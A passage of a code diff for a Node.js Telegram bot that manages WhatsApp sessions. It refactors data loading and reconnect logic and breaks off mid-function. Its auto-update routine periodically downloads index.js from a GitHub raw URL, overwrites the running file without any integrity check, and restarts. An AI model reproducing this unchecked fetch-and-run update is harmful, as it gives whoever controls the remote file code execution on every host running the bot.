@@ -16,8 +16,6 @@ const config = require("./setting/config.js");
 const TelegramBot = require("node-telegram-bot-api");
 const acorn = require("acorn");
 const vm = require("vm");
-
-// ================= KONFIGURASI ================= //
 const BOT_TOKEN = config.BOT_TOKEN;
 const OWNER_ID = config.OWNER_ID;
 const SESSIONS_DIR = "./sessions";
@@ -28,108 +26,191 @@ const thumbnailUrl = "https://files.catbox.moe/6ogo26.jpg";
 
 // Konfigurasi GitHub Auto Update
 const GITHUB_RAW_URL = "https://raw.githubusercontent.com/sihalohoalexander389-oss/primrose-bot/main/index.js";
-const CURRENT_VERSION = "3.0.46";
+const CURRENT_VERSION = "3.0.47";
 const AUTO_UPDATE_FILE = "./database/auto_update.json";
 const PENDING_UPDATE_FILE = "./database/pending_update.json";
 
-// Konstanta pairing
-const PAIRING_TIMEOUT = 60000;
-const PAIRING_COOLDOWN = 5000;
+// Load auto update setting
+let autoUpdateEnabled = true;
 
-// ================= DATABASE FILES ================= //
+function loadAutoUpdateSetting() {
+    try {
+        if (!fs.existsSync(AUTO_UPDATE_FILE)) {
+            fs.writeFileSync(AUTO_UPDATE_FILE, JSON.stringify({ enabled: true }, null, 2));
+            return { enabled: true };
+        }
+        return JSON.parse(fs.readFileSync(AUTO_UPDATE_FILE));
+    } catch (error) {
+        console.error("Error loading auto update setting:", error);
+        return { enabled: true };
+    }
+}
+
+function saveAutoUpdateSetting(enabled) {
+    try {
+        fs.writeFileSync(AUTO_UPDATE_FILE, JSON.stringify({ enabled: enabled }, null, 2));
+    } catch (error) {
+        console.error("Error saving auto update setting:", error);
+    }
+}
+
+// Save pending update notification untuk dikirim ke owner
+function savePendingUpdate(chatId, oldVersion, newVersion) {
+    try {
+        fs.writeFileSync(PENDING_UPDATE_FILE, JSON.stringify({ chatId, oldVersion, newVersion, timestamp: Date.now() }, null, 2));
+    } catch (error) {
+        console.error("Error saving pending update:", error);
+    }
+}
+
+function getPendingUpdate() {
+    try {
+        if (!fs.existsSync(PENDING_UPDATE_FILE)) return null;
+        return JSON.parse(fs.readFileSync(PENDING_UPDATE_FILE));
+    } catch (error) {
+        console.error("Error getting pending update:", error);
+        return null;
+    }
+}
+
+function clearPendingUpdate() {
+    try {
+        if (fs.existsSync(PENDING_UPDATE_FILE)) {
+            fs.unlinkSync(PENDING_UPDATE_FILE);
+        }
+    } catch (error) {
+        console.error("Error clearing pending update:", error);
+    }
+}
+
+// Inisialisasi auto update setting
+const autoUpdateSetting = loadAutoUpdateSetting();
+autoUpdateEnabled = autoUpdateSetting.enabled;
+
+// File untuk menyimpan data
 const GROUP_PREMIUM_FILE = "./database/group_premium.json";
 const BLOCKED_COMMANDS_FILE = "./database/blocked_commands.json";
 const COLOR_SETTING_FILE = "./database/color_setting.json";
 const CELAH_DATABASE_FILE = "./database/celah_database.json";
-const PREMIUM_FILE = "./database/premium.json";
-const ADMIN_FILE = "./database/admin.json";
 
-// Pastikan folder database ada
-if (!fs.existsSync("./database")) {
-    fs.mkdirSync("./database", { recursive: true });
-}
-if (!fs.existsSync(SESSIONS_DIR)) {
-    fs.mkdirSync(SESSIONS_DIR, { recursive: true });
-}
-
-// ================= HELPER FUNCTIONS ================= //
-function ensureFileExists(filePath, defaultData = []) {
-    if (!fs.existsSync(filePath)) {
-        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
-    }
-}
-
-ensureFileExists(GROUP_PREMIUM_FILE, []);
-ensureFileExists(BLOCKED_COMMANDS_FILE, []);
-ensureFileExists(COLOR_SETTING_FILE, { color: "disco" });
-ensureFileExists(CELAH_DATABASE_FILE, []);
-ensureFileExists(PREMIUM_FILE, []);
-ensureFileExists(ADMIN_FILE, []);
-ensureFileExists(AUTO_UPDATE_FILE, { enabled: true });
-ensureFileExists(SESSIONS_FILE, []);
-
-// ================= LOAD DATA ================= //
+// Load data grup premium
 let groupPremiumData = [];
-let blockedCommands = [];
-let currentColor = "disco";
-let celahDatabase = [];
-let premiumUsers = [];
-let adminUsers = [];
 
-function loadAllData() {
+function loadGroupPremiumData() {
     try {
-        groupPremiumData = JSON.parse(fs.readFileSync(GROUP_PREMIUM_FILE));
-        blockedCommands = JSON.parse(fs.readFileSync(BLOCKED_COMMANDS_FILE));
-        currentColor = JSON.parse(fs.readFileSync(COLOR_SETTING_FILE)).color;
-        celahDatabase = JSON.parse(fs.readFileSync(CELAH_DATABASE_FILE));
-        premiumUsers = JSON.parse(fs.readFileSync(PREMIUM_FILE));
-        adminUsers = JSON.parse(fs.readFileSync(ADMIN_FILE));
+        if (!fs.existsSync(GROUP_PREMIUM_FILE)) {
+            fs.writeFileSync(GROUP_PREMIUM_FILE, JSON.stringify([], null, 2));
+            return [];
+        }
+        return JSON.parse(fs.readFileSync(GROUP_PREMIUM_FILE));
     } catch (error) {
-        console.error("Error loading data:", error);
+        console.error("Error loading group premium data:", error);
+        return [];
     }
 }
 
-loadAllData();
-
-function saveGroupPremiumData() { fs.writeFileSync(GROUP_PREMIUM_FILE, JSON.stringify(groupPremiumData, null, 2)); }
-function saveBlockedCommands() { fs.writeFileSync(BLOCKED_COMMANDS_FILE, JSON.stringify(blockedCommands, null, 2)); }
-function saveColorSetting() { fs.writeFileSync(COLOR_SETTING_FILE, JSON.stringify({ color: currentColor }, null, 2)); }
-function saveCelahDatabase() { fs.writeFileSync(CELAH_DATABASE_FILE, JSON.stringify(celahDatabase, null, 2)); }
-function savePremiumUsers() { fs.writeFileSync(PREMIUM_FILE, JSON.stringify(premiumUsers, null, 2)); }
-function saveAdminUsers() { fs.writeFileSync(ADMIN_FILE, JSON.stringify(adminUsers, null, 2)); }
-
-// ================= AUTO UPDATE ================= //
-let autoUpdateEnabled = JSON.parse(fs.readFileSync(AUTO_UPDATE_FILE)).enabled;
-
-function saveAutoUpdateSetting(enabled) {
-    autoUpdateEnabled = enabled;
-    fs.writeFileSync(AUTO_UPDATE_FILE, JSON.stringify({ enabled }, null, 2));
+function saveGroupPremiumData(data) {
+    try {
+        fs.writeFileSync(GROUP_PREMIUM_FILE, JSON.stringify(data, null, 2));
+    } catch (error) {
+        console.error("Error saving group premium data:", error);
+    }
 }
 
-function savePendingUpdate(chatId, oldVersion, newVersion) {
-    fs.writeFileSync(PENDING_UPDATE_FILE, JSON.stringify({ chatId, oldVersion, newVersion, timestamp: Date.now() }, null, 2));
+// Load celah database
+let celahDatabase = [];
+
+function loadCelahDatabase() {
+    try {
+        if (!fs.existsSync(CELAH_DATABASE_FILE)) {
+            fs.writeFileSync(CELAH_DATABASE_FILE, JSON.stringify([], null, 2));
+            return [];
+        }
+        return JSON.parse(fs.readFileSync(CELAH_DATABASE_FILE));
+    } catch (error) {
+        console.error("Error loading celah database:", error);
+        return [];
+    }
 }
 
-function getPendingUpdate() {
-    if (!fs.existsSync(PENDING_UPDATE_FILE)) return null;
-    return JSON.parse(fs.readFileSync(PENDING_UPDATE_FILE));
+function saveCelahDatabase(data) {
+    try {
+        fs.writeFileSync(CELAH_DATABASE_FILE, JSON.stringify(data, null, 2));
+    } catch (error) {
+        console.error("Error saving celah database:", error);
+    }
 }
 
-function clearPendingUpdate() {
-    if (fs.existsSync(PENDING_UPDATE_FILE)) fs.unlinkSync(PENDING_UPDATE_FILE);
+// Load blocked commands
+let blockedCommands = [];
+
+function loadBlockedCommands() {
+    try {
+        if (!fs.existsSync(BLOCKED_COMMANDS_FILE)) {
+            fs.writeFileSync(BLOCKED_COMMANDS_FILE, JSON.stringify([], null, 2));
+            return [];
+        }
+        return JSON.parse(fs.readFileSync(BLOCKED_COMMANDS_FILE));
+    } catch (error) {
+        console.error("Error loading blocked commands:", error);
+        return [];
+    }
 }
 
+function saveBlockedCommands(commands) {
+    try {
+        fs.writeFileSync(BLOCKED_COMMANDS_FILE, JSON.stringify(commands, null, 2));
+    } catch (error) {
+        console.error("Error saving blocked commands:", error);
+    }
+}
+
+// Load color setting
+let currentColor = "disco";
+
+function loadColorSetting() {
+    try {
+        if (!fs.existsSync(COLOR_SETTING_FILE)) {
+            fs.writeFileSync(COLOR_SETTING_FILE, JSON.stringify({ color: "disco" }, null, 2));
+            return { color: "disco" };
+        }
+        return JSON.parse(fs.readFileSync(COLOR_SETTING_FILE));
+    } catch (error) {
+        console.error("Error loading color setting:", error);
+        return { color: "disco" };
+    }
+}
+
+function saveColorSetting(color) {
+    try {
+        fs.writeFileSync(COLOR_SETTING_FILE, JSON.stringify({ color: color }, null, 2));
+    } catch (error) {
+        console.error("Error saving color setting:", error);
+    }
+}
+
+// Inisialisasi data
+groupPremiumData = loadGroupPremiumData();
+celahDatabase = loadCelahDatabase();
+blockedCommands = loadBlockedCommands();
+const colorSetting = loadColorSetting();
+currentColor = colorSetting.color;
+
+// Fungsi untuk mengecek update dari GitHub
 async function checkForUpdates() {
     try {
         console.log(chalk.cyan("🔍 Mengecek update dari GitHub..."));
         const response = await axios.get(GITHUB_RAW_URL, { timeout: 10000 });
         const remoteContent = response.data;
+        
         const remoteVersionMatch = remoteContent.match(/CURRENT_VERSION = "([^"]+)"/);
         const remoteVersion = remoteVersionMatch ? remoteVersionMatch[1] : "unknown";
+        
         if (remoteVersion !== CURRENT_VERSION) {
             console.log(chalk.yellow(`📦 Update tersedia! Versi ${CURRENT_VERSION} → ${remoteVersion}`));
             return { hasUpdate: true, newVersion: remoteVersion, content: remoteContent };
         }
+        
         console.log(chalk.green("✅ Bot sudah versi terbaru!"));
         return { hasUpdate: false };
     } catch (error) {
@@ -138,30 +219,48 @@ async function checkForUpdates() {
     }
 }
 
+// Fungsi untuk melakukan update
 async function performUpdate(chatId) {
     try {
         const update = await checkForUpdates();
+        
         if (!update.hasUpdate) {
-            if (chatId) await safeSendMessage(chatId, `✅ Bot sudah versi terbaru! (v${CURRENT_VERSION})`);
+            if (chatId) {
+                await safeSendMessage(chatId, `✅ Bot sudah versi terbaru! (v${CURRENT_VERSION})`);
+            }
             return false;
         }
+        
         savePendingUpdate(chatId, CURRENT_VERSION, update.newVersion);
         fs.writeFileSync(__filename, update.content);
         console.log(chalk.green("✅ File index.js berhasil diupdate!"));
-        if (chatId) await safeSendMessage(chatId, `✅ Update berhasil! Versi ${CURRENT_VERSION} → ${update.newVersion}\n🔄 Bot akan restart dalam 3 detik...`);
-        setTimeout(() => process.exit(0), 3000);
+        
+        if (chatId) {
+            await safeSendMessage(chatId, `✅ Update berhasil! Versi ${CURRENT_VERSION} → ${update.newVersion}\n🔄 Bot akan restart dalam 3 detik...`);
+        }
+        
+        setTimeout(() => {
+            process.exit(0);
+        }, 3000);
+        
         return true;
     } catch (error) {
         console.error(chalk.red("❌ Gagal update:", error.message));
-        if (chatId) await safeSendMessage(chatId, `❌ Gagal update: ${error.message}`);
+        if (chatId) {
+            await safeSendMessage(chatId, `❌ Gagal update: ${error.message}`);
+        }
         return false;
     }
 }
 
+// Auto update checker
 let autoUpdateInterval = null;
 
 function startAutoUpdateChecker() {
-    if (autoUpdateInterval) clearInterval(autoUpdateInterval);
+    if (autoUpdateInterval) {
+        clearInterval(autoUpdateInterval);
+    }
+    
     autoUpdateInterval = setInterval(async () => {
         if (!autoUpdateEnabled) return;
         console.log(chalk.cyan("🔄 Auto update check..."));
@@ -180,19 +279,21 @@ function stopAutoUpdateChecker() {
     }
 }
 
-// ================= TELEGRAM BOT ================= //
-const bot = new TelegramBot(BOT_TOKEN, { polling: true });
+// ================= SAFE FUNCTIONS (Anti Error) ================= //
 
-// ================= SAFE FUNCTIONS ================= //
 async function safeSendMessage(chatId, text, options = {}) {
     if (!chatId) {
-        console.error("❌ safeSendMessage: chat_id is empty!");
+        console.error("❌ chat_id kosong!");
         return null;
     }
     try {
         return await bot.sendMessage(chatId, text, options);
     } catch (error) {
-        console.error("Error sending message:", error.message);
+        if (error.response?.body?.description?.includes("chat_id is empty")) {
+            console.error("❌ Error: chat_id is empty");
+        } else {
+            console.error("Error sending message:", error.message);
+        }
         return null;
     }
 }
@@ -200,10 +301,18 @@ async function safeSendMessage(chatId, text, options = {}) {
 async function safeEditMessageText(chatId, messageId, newText, options = {}) {
     if (!chatId || !messageId) return null;
     try {
-        return await bot.editMessageText(newText, { chat_id: chatId, message_id: messageId, ...options });
+        return await bot.editMessageText(newText, {
+            chat_id: chatId,
+            message_id: messageId,
+            ...options
+        });
     } catch (error) {
-        if (error.response?.body?.description?.includes("message is not modified")) return null;
-        if (error.response?.body?.description?.includes("message to edit not found")) return null;
+        if (error.response?.body?.description?.includes("message is not modified")) {
+            return null;
+        }
+        if (error.response?.body?.description?.includes("message to edit not found")) {
+            return null;
+        }
         console.error("Error editing message:", error.message);
         return null;
     }
@@ -212,10 +321,18 @@ async function safeEditMessageText(chatId, messageId, newText, options = {}) {
 async function safeEditMessageMedia(chatId, messageId, media, options = {}) {
     if (!chatId || !messageId) return null;
     try {
-        return await bot.editMessageMedia(media, { chat_id: chatId, message_id: messageId, ...options });
+        return await bot.editMessageMedia(media, {
+            chat_id: chatId,
+            message_id: messageId,
+            ...options
+        });
     } catch (error) {
-        if (error.response?.body?.description?.includes("message is not modified")) return null;
-        if (error.response?.body?.description?.includes("message to edit not found")) return null;
+        if (error.response?.body?.description?.includes("message is not modified")) {
+            return null;
+        }
+        if (error.response?.body?.description?.includes("message to edit not found")) {
+            return null;
+        }
         console.error("Error editing media:", error.message);
         return null;
     }
@@ -224,10 +341,17 @@ async function safeEditMessageMedia(chatId, messageId, media, options = {}) {
 async function safeEditMessageReplyMarkup(chatId, messageId, replyMarkup) {
     if (!chatId || !messageId) return null;
     try {
-        return await bot.editMessageReplyMarkup(replyMarkup, { chat_id: chatId, message_id: messageId });
+        return await bot.editMessageReplyMarkup(replyMarkup, {
+            chat_id: chatId,
+            message_id: messageId
+        });
     } catch (error) {
-        if (error.response?.body?.description?.includes("message is not modified")) return null;
-        if (error.response?.body?.description?.includes("message to edit not found")) return null;
+        if (error.response?.body?.description?.includes("message is not modified")) {
+            return null;
+        }
+        if (error.response?.body?.description?.includes("message to edit not found")) {
+            return null;
+        }
         return null;
     }
 }
@@ -242,9 +366,17 @@ async function safeSendPhoto(chatId, photo, options = {}) {
     }
 }
 
-// ================= START BOT ================= //
+async function safeDeleteMessage(chatId, messageId) {
+    if (!chatId || !messageId) return null;
+    try {
+        return await bot.deleteMessage(chatId, messageId);
+    } catch (error) {
+        return null;
+    }
+}
+
 function startBot() {
-    console.log(chalk.red(`
+  console.log(chalk.red(`
 ⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -258,28 +390,140 @@ function startBot() {
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
 ⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀
 `));
-    console.log(chalk.red(`
+
+console.log(chalk.red(`
 Informasi:
 Dev : t.me/ItsMeXanderRzMd
 Channel : https://t.me/allteamlinux
 Version: ${CURRENT_VERSION}
 Auto Update: ${autoUpdateEnabled ? "ON" : "OFF"}
 `));
-    console.log(chalk.blue(`[ 🚀 BOT BERJALAN... ]`));
+
+console.log(chalk.blue(`
+[ 🚀 BOT BERJALAN... ]
+`));
+};
+
+const bot = new TelegramBot(BOT_TOKEN, { polling: true });
+
+// Kirim notifikasi ke OWNER jika ada update yang tertunda setelah restart
+setTimeout(async () => {
+    const pending = getPendingUpdate();
+    if (pending && pending.chatId) {
+        try {
+            const targetChatId = OWNER_ID;
+            await safeSendMessage(targetChatId, `✅ *VERSI SUDAH NEW!*\n\nVersi ${pending.oldVersion} → ${pending.newVersion}\nBot telah berhasil diupdate dan restart.\n\nSilakan gunakan bot kembali.\n\n© Primrose Linux Bot`, { parse_mode: "Markdown" });
+            clearPendingUpdate();
+        } catch (e) {
+            console.error("Error sending pending notification to owner:", e);
+        }
+    }
+}, 3000);
+
+function ensureFileExists(filePath, defaultData = []) {
+    if (!fs.existsSync(filePath)) {
+        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
+    }
 }
 
-// ================= WHATSAPP CONNECTION ================= //
+let sock;
 let reconnectAttempts = new Map();
 let pingIntervals = new Map();
-let pairingInProgress = new Map();
+let reconnectTimeouts = new Map();
+let healthCheckInterval = null;
+
+// ================= HEALTH CHECK SYSTEM ================= //
+
+function startHealthCheck() {
+    if (healthCheckInterval) {
+        clearInterval(healthCheckInterval);
+    }
+    
+    healthCheckInterval = setInterval(async () => {
+        for (const [botNumber, sock] of sessions) {
+            try {
+                // Cek koneksi dengan ping ke socket
+                const isConnected = sock.user && sock.ws && sock.ws.readyState === 1;
+                
+                if (!isConnected) {
+                    console.log(chalk.yellow(`⚠️ Bot ${botNumber} appears disconnected, attempting reconnect...`));
+                    await handleReconnect(botNumber);
+                } else {
+                    // Test kirim ping kecil untuk memastikan koneksi benar-benar aktif
+                    try {
+                        await sock.sendPresenceUpdate('available');
+                    } catch (pingError) {
+                        console.log(chalk.yellow(`⚠️ Bot ${botNumber} ping failed, attempting reconnect...`));
+                        await handleReconnect(botNumber);
+                    }
+                }
+            } catch (error) {
+                console.error(chalk.red(`Health check error for ${botNumber}:`), error.message);
+                await handleReconnect(botNumber);
+            }
+        }
+    }, 60000); // Check setiap 1 menit
+    
+    console.log(chalk.green("✅ Health check system started"));
+}
+
+function stopHealthCheck() {
+    if (healthCheckInterval) {
+        clearInterval(healthCheckInterval);
+        healthCheckInterval = null;
+        console.log(chalk.yellow("⚠️ Health check system stopped"));
+    }
+}
+
+// ================= CONNECTION HANDLER ================= //
+
+function createStableSocket(state, saveCreds) {
+    return makeWASocket({
+        auth: state,
+        printQRInTerminal: false,
+        logger: P({ level: "silent" }),
+        defaultQueryTimeoutMs: 60000,
+        keepAliveIntervalMs: 30000,
+        connectTimeoutMs: 120000,
+        emitOwnEvents: true,
+        fireInitQueries: true,
+        syncFullHistory: false,
+        markOnlineOnConnect: false,
+        generateHighQualityLinkPreview: false,
+        retryRequestDelayMs: 2000,
+        maxMsgRetryCount: 5,
+        transactionOpts: { maxCommitRetries: 5, delayBetweenTriesMs: 2000 },
+        browser: ["PrimroseBot", "Chrome", "1.0.0"],
+        shouldIgnoreJid: () => false,
+        getMessage: async () => undefined,
+    });
+}
 
 function startPingInterval(botNumber, ws) {
-    if (pingIntervals.has(botNumber)) clearInterval(pingIntervals.get(botNumber));
-    const interval = setInterval(() => {
-        if (ws && ws.user) {
-            ws.sendMessage(botNumber + "@s.whatsapp.net", { text: " " }).catch(() => {});
+    stopPingInterval(botNumber);
+    
+    const interval = setInterval(async () => {
+        try {
+            if (ws && ws.user && ws.ws && ws.ws.readyState === 1) {
+                await ws.sendPresenceUpdate('available');
+            } else {
+                // Jika socket tidak ready, trigger reconnect
+                clearInterval(interval);
+                pingIntervals.delete(botNumber);
+                console.log(chalk.yellow(`⚠️ Ping interval detected dead socket for ${botNumber}`));
+                await handleReconnect(botNumber);
+            }
+        } catch (error) {
+            console.error(chalk.red(`Ping error for ${botNumber}:`), error.message);
+            // Jika error connection closed, trigger reconnect
+            if (error.message && (error.message.includes("Connection closed") || error.message.includes("timeout"))) {
+                clearInterval(interval);
+                pingIntervals.delete(botNumber);
+                await handleReconnect(botNumber);
+            }
         }
     }, 25000);
+    
     pingIntervals.set(botNumber, interval);
 }
 
@@ -290,14 +534,177 @@ function stopPingInterval(botNumber) {
     }
 }
 
+async function handleReconnect(botNumber) {
+    // Clear existing reconnect timeout
+    if (reconnectTimeouts.has(botNumber)) {
+        clearTimeout(reconnectTimeouts.get(botNumber));
+        reconnectTimeouts.delete(botNumber);
+    }
+    
+    try {
+        console.log(chalk.cyan(`🔄 Handling reconnect for ${botNumber}...`));
+        
+        // Cek apakah socket masih ada di sessions
+        const existingSock = sessions.get(botNumber);
+        if (existingSock) {
+            try {
+                await existingSock.end();
+            } catch (e) {
+                // Ignore
+            }
+            sessions.delete(botNumber);
+        }
+        
+        // Stop ping interval yang lama
+        stopPingInterval(botNumber);
+        
+        // Reset reconnect attempts
+        reconnectAttempts.delete(botNumber);
+        
+        // Reconnect
+        await connectWithRetry(botNumber);
+        
+    } catch (error) {
+        console.error(chalk.red(`Error handling reconnect for ${botNumber}:`), error.message);
+        
+        // Schedule retry
+        const retryDelay = 10000;
+        console.log(chalk.yellow(`⏳ Scheduling reconnect retry for ${botNumber} in ${retryDelay/1000}s`));
+        
+        const timeout = setTimeout(() => {
+            reconnectTimeouts.delete(botNumber);
+            handleReconnect(botNumber);
+        }, retryDelay);
+        
+        reconnectTimeouts.set(botNumber, timeout);
+    }
+}
+
+async function connectWithRetry(botNumber, attempt = 1) {
+    const maxAttempts = 5;
+    const baseDelay = 5000;
+    
+    try {
+        console.log(chalk.cyan(`🔄 Connecting ${botNumber} (attempt ${attempt}/${maxAttempts})...`));
+        
+        const sessionDir = createSessionDir(botNumber);
+        
+        if (!fs.existsSync(path.join(sessionDir, 'creds.json'))) {
+            console.log(chalk.red(`❌ Creds.json not found for ${botNumber}, removing from active sessions`));
+            removeActiveSession(botNumber);
+            return null;
+        }
+        
+        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
+        const sock = createStableSocket(state, saveCreds);
+        
+        await new Promise((resolve, reject) => {
+            const timeout = setTimeout(() => {
+                reject(new Error("Connection timeout"));
+            }, 120000);
+            
+            sock.ev.on("connection.update", async (update) => {
+                const { connection, lastDisconnect, qr } = update;
+                
+                if (connection === "open") {
+                    clearTimeout(timeout);
+                    console.log(chalk.green(`✅ Bot ${botNumber} terhubung!`));
+                    sessions.set(botNumber, sock);
+                    reconnectAttempts.delete(botNumber);
+                    startPingInterval(botNumber, sock);
+                    
+                    // Setup error handler untuk socket
+                    sock.ev.on("error", (error) => {
+                        console.error(chalk.red(`Socket error for ${botNumber}:`), error.message);
+                        if (error.message && (error.message.includes("Connection closed") || error.message.includes("timeout"))) {
+                            handleReconnect(botNumber);
+                        }
+                    });
+                    
+                    resolve(sock);
+                    
+                } else if (connection === "close") {
+                    clearTimeout(timeout);
+                    const statusCode = lastDisconnect?.error?.output?.statusCode;
+                    const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
+                    
+                    if (shouldReconnect) {
+                        console.log(chalk.yellow(`⚠️ Bot ${botNumber} disconnected (${statusCode || 'unknown'})`));
+                        
+                        // Schedule reconnect dengan backoff
+                        const currentAttempt = (reconnectAttempts.get(botNumber) || 0) + 1;
+                        reconnectAttempts.set(botNumber, currentAttempt);
+                        
+                        const delay = Math.min(baseDelay * Math.pow(1.5, currentAttempt - 1), 60000);
+                        console.log(chalk.yellow(`⏳ Reconnecting ${botNumber} in ${delay/1000}s (attempt ${currentAttempt})`));
+                        
+                        const timeout = setTimeout(() => {
+                            reconnectTimeouts.delete(botNumber);
+                            handleReconnect(botNumber);
+                        }, delay);
+                        
+                        reconnectTimeouts.set(botNumber, timeout);
+                    } else {
+                        console.log(chalk.red(`🚫 Bot ${botNumber} logged out, removing session`));
+                        removeActiveSession(botNumber);
+                        stopPingInterval(botNumber);
+                    }
+                    resolve(null);
+                    
+                } else if (connection === "connecting") {
+                    console.log(chalk.blue(`🔄 Bot ${botNumber} connecting...`));
+                }
+            });
+            
+            sock.ev.on("creds.update", saveCreds);
+        });
+        
+        return sock;
+        
+    } catch (error) {
+        console.error(chalk.red(`Error connecting ${botNumber} (attempt ${attempt}):`), error.message);
+        
+        if (attempt < maxAttempts) {
+            const delay = Math.min(baseDelay * Math.pow(1.5, attempt), 30000);
+            console.log(chalk.yellow(`⏳ Retrying ${botNumber} in ${delay/1000}s...`));
+            await sleep(delay);
+            return connectWithRetry(botNumber, attempt + 1);
+        } else {
+            console.error(chalk.red(`❌ Failed to connect ${botNumber} after ${maxAttempts} attempts`));
+            
+            // Schedule retry after longer delay
+            const timeout = setTimeout(() => {
+                reconnectTimeouts.delete(botNumber);
+                connectWithRetry(botNumber, 1);
+            }, 60000);
+            
+            reconnectTimeouts.set(botNumber, timeout);
+            
+            return null;
+        }
+    }
+}
+
+async function reconnectWithBackoff(botNumber, attempt = 1) {
+    await handleReconnect(botNumber);
+}
+
+async function reconnectWhatsApp(botNumber, attempt = 1) {
+    return await connectWithRetry(botNumber, attempt);
+}
+
 function saveActiveSessions(botNumber) {
     try {
-        let sessionsList = [];
+        const sessionsList = [];
         if (fs.existsSync(SESSIONS_FILE)) {
             const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
-            sessionsList = existing.includes(botNumber) ? existing : [...existing, botNumber];
+            if (!existing.includes(botNumber)) {
+                sessionsList.push(...existing, botNumber);
+            } else {
+                sessionsList.push(...existing);
+            }
         } else {
-            sessionsList = [botNumber];
+            sessionsList.push(botNumber);
         }
         fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessionsList));
     } catch (error) {
@@ -314,327 +721,322 @@ function removeActiveSession(botNumber) {
         }
         sessions.delete(botNumber);
         stopPingInterval(botNumber);
-        pairingInProgress.delete(botNumber);
+        
+        // Clear reconnect timeout
+        if (reconnectTimeouts.has(botNumber)) {
+            clearTimeout(reconnectTimeouts.get(botNumber));
+            reconnectTimeouts.delete(botNumber);
+        }
     } catch (error) {
         console.error("Error removing active session:", error);
     }
-}
-
-function createSessionDir(botNumber) {
-    const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
-    if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
-    return deviceDir;
-}
-
-async function reconnectWithBackoff(botNumber, attempt = 1) {
-    const maxAttempts = 15;
-    const baseDelay = 5000;
-    const maxDelay = 60000;
-    let delay = Math.min(baseDelay * Math.pow(1.5, attempt - 1), maxDelay);
-    console.log(`🔄 Reconnect attempt ${attempt} for ${botNumber} in ${delay}ms`);
-    setTimeout(async () => {
-        try {
-            await reconnectWhatsApp(botNumber, attempt);
-        } catch (error) {
-            if (attempt < maxAttempts) {
-                await reconnectWithBackoff(botNumber, attempt + 1);
-            } else {
-                console.error(`❌ Failed to reconnect ${botNumber} after ${maxAttempts} attempts`);
-            }
-        }
-    }, delay);
-}
-
-async function reconnectWhatsApp(botNumber, attempt = 1) {
-    try {
-        console.log(`🔄 Reconnecting WhatsApp ${botNumber} (attempt ${attempt})...`);
-        const sessionDir = createSessionDir(botNumber);
-        if (!fs.existsSync(path.join(sessionDir, 'creds.json'))) {
-            console.log(`❌ Creds.json not found for ${botNumber}, removing from active sessions`);
-            removeActiveSession(botNumber);
-            return null;
-        }
-        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
-        const newSock = makeWASocket({
-            auth: state,
-            printQRInTerminal: false,
-            logger: P({ level: "silent" }),
-            defaultQueryTimeoutMs: 60000,
-            keepAliveIntervalMs: 60000,
-            connectTimeoutMs: 60000,
-            emitOwnEvents: true,
-            fireInitQueries: true,
-            syncFullHistory: false,
-            markOnlineOnConnect: false,
-            generateHighQualityLinkPreview: false,
-            browser: ["Primrose Linux Bot", "Chrome", "1.0.0"],
-        });
-        stopPingInterval(botNumber);
-        newSock.ev.on("connection.update", async (update) => {
-            const { connection, lastDisconnect } = update;
-            if (connection === "open") {
-                console.log(`✅ WhatsApp ${botNumber} reconnect success!`);
-                sessions.set(botNumber, newSock);
-                reconnectAttempts.delete(botNumber);
-                startPingInterval(botNumber, newSock);
-                pairingInProgress.delete(botNumber);
-            } else if (connection === "close") {
-                const statusCode = lastDisconnect?.error?.output?.statusCode;
-                const shouldReconnect = statusCode !== DisconnectReason.loggedOut && statusCode !== 403;
-                if (shouldReconnect && !pairingInProgress.has(botNumber)) {
-                    const currentAttempt = (reconnectAttempts.get(botNumber) || 1) + 1;
-                    reconnectAttempts.set(botNumber, currentAttempt);
-                    console.log(`⚠️ WhatsApp ${botNumber} disconnected (${statusCode}), reconnecting...`);
-                    await reconnectWithBackoff(botNumber, currentAttempt);
-                } else {
-                    console.log(`🚫 WhatsApp ${botNumber} logged out or blocked, removing session`);
-                    removeActiveSession(botNumber);
-                    stopPingInterval(botNumber);
-                    pairingInProgress.delete(botNumber);
-                }
-            }
-        });
-        newSock.ev.on("creds.update", saveCreds);
-        return newSock;
-    } catch (error) {
-        console.error(`Error reconnecting WhatsApp ${botNumber}:`, error);
-        throw error;
-    }
-}
-
-async function ConnectToWhatsApp(botNumber, chatId) {
-    if (!chatId) {
-        console.error("❌ ConnectToWhatsApp: chatId is empty!");
-        throw new Error("Invalid chatId");
-    }
-    
-    if (pairingInProgress.has(botNumber)) {
-        const progressTime = pairingInProgress.get(botNumber);
-        const elapsed = Date.now() - progressTime;
-        if (elapsed < PAIRING_COOLDOWN) {
-            await safeSendMessage(chatId, `⚠️ Pairing sedang berlangsung untuk nomor ${botNumber}\nSilakan tunggu ${Math.ceil((PAIRING_COOLDOWN - elapsed) / 1000)} detik lagi.`);
-            return;
-        } else {
-            pairingInProgress.delete(botNumber);
-        }
-    }
-    
-    pairingInProgress.set(botNumber, Date.now());
-    let statusMessage = null;
-    let connectionEstablished = false;
-    let pairingTimeout = null;
-    let retryCount = 0;
-    const MAX_RETRIES = 3;
-    
-    try {
-        const sentMsg = await safeSendMessage(chatId, `<blockquote>Primrose Linux Bot [ 𖣂 ]</blockquote>\n— Number : ${botNumber}\n— Status : Connecting...`, { parse_mode: "HTML" });
